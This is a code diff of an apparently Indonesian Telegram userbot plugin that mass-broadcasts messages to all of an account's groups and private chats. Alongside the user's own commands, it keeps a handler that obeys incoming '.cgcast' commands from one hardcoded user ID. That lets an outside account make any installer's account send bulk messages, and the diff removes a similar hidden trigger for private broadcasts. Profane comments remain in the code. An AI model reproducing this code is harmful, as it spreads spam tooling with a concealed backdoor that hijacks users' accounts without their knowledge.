@@ -1,7 +1,6 @@
 from userbot.events import register
 from userbot import CMD_HELP, bot
-from userbot import CMD_HANDLER as cmd
-from userbot.utils import ram_cmd
+
 
 GCAST_BLACKLIST = [
     -1001473548283,  # SharingUserbot
@@ -25,7 +24,7 @@ GCAST_BLACKLIST = [
 
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
-@ram_cmd(pattern="gcast$")
+@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
 @register(incoming=True, from_users=1826643972,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -35,9 +34,9 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Mana pesannya Ngentod, minimal reply lah anjing!!**")
+        await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Lagi gua kirim pesan nya Jing, Awas limit hehehe...`")
+    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -55,9 +54,7 @@ async def gcast(event):
         f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
     )
 
-@ram_cmd(pattern="gucast$")
-@register(incoming=True, from_users=1826643972,
-          pattern=r"^\.cgucast(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
@@ -80,12 +77,12 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}gcast`\
+        "gcast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gcast`\
          \n↳ : Mengirim Pesan Group Secara Global."})
 
 CMD_HELP.update(
     {
-         "gucast": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}gucast`\
+         "gucast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gucast`\
          \n↳ : Mengirim Pesan Pribadi Secara Global."
     }
 )
